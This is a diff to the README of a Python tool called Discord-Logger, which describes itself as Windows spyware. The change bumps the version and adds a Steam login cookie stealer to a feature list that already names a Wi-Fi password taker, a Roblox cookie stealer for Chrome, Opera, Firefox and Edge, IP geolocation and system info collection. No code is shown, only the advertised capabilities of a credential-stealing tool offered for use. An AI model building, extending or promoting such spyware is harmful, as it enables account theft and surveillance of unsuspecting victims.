@@ -1,4 +1,4 @@
-# Discord-Logger
+# Discord-Logger 1.0.5
 A logger/spyware written in python 3\
 Only works in windows, dont expect to work for other OS\
 \
@@ -8,6 +8,7 @@ This logger can has:
 • Wifi-password taker
 • Auto IP geolocator(city,country,postal,latitude&longitude)
 • Roblox Cookie Stealer from Chrome,Opera,Firefox and Edge
+• steamLoginSecure Token taker(steam login cookie) from browser
 • IP logger
 • System info
 ```
